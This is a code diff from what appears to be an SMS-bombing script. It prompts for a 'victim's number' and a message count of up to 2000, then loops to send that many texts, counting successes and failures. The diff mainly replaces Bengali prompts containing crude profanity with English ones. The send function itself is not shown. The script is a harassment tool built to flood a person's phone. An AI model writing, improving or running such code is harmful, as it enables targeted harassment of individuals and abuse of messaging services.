@@ -26,8 +26,8 @@ def send(target):
   return True
 
 def main():
-  target = input("\n\n\n\n\033[1;93m[*] যারে চুদবা তার নাম্বার দে খানকির পোলা😑: ")
-  amount = int(input("\033[1;96m[*] চোদার পরিমান😑 (সর্বোচ্চ ২০০০) : "))
+  target = input("\n\n\n\n\033[1;93m[*] ENTER VICTIMS NUMBER: ")
+  amount = int(input("\033[1;96m[*] THREAT (HIGHEST 2000!!) : "))
   sent, nsent = 0, amount
   for i in range(1, amount + 1):
     try:
@@ -36,7 +36,7 @@ def main():
         sent += 1
         nsent -= 1
       else:
-        print(f"[ID: {i}] SMS Not Sent...")
+        print(f"[ID: {i}] SMS Not Sent Try again...")
     except KeyboardInterrupt: break
     except Exception as e: print(e); break
   print(f"\n[*] Total Threat : {amount}\n[+] Sent: {sent}\n[-] Not Sent: {nsent}")
